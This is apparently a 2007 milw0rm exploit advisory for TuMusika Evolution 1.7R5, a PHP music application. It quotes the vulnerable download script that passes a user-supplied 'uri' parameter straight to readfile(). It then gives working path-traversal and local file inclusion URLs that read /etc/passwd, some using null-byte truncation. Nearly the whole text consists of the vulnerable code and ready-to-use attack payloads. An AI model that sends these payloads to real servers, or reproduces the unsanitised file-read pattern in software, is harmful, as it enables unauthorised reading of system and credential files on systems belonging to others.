@@ -1,0 +1,22 @@
+TuMusika Evolution 1.7R5 Remote File Disclosure Vulnerability
+Script : http://sourceforge.net/project/platformdownload.php?group_id=186000
+#################/frames/nogui/sc_download.php#################
+<?
+$file = $_GET['uri'] ;<---[xxx]
+$title = $_GET['title'] ;
+header('HTTP/1.1 200 OK');
+header("content-type:audio/mp3");
+header('Content-Disposition: attachment; filename="'.$title.'.mp3"' );  
+readfile($file);<---[xxx]
+?>
+###############################################################
+Exploit:
+/Evolution1.7/frames/nogui/sc_download.php?uri=../../../../../../etc/passwd
+###############################################################
+TuMusika Evolution 1.7R5 Local File Inclusion Vulnerabiliies
+POC:
+/Evolution1.7/inc/languages_n.php?language=../../../../../../etc/passwd%00
+/Evolution1.7/inc/languages_f.php?language=../../../../../../etc/passwd%00
+/Evolution1.7/inc/languages.php?language=../../../../../../etc/passwd%00
+
+# milw0rm.com [2007-11-28]
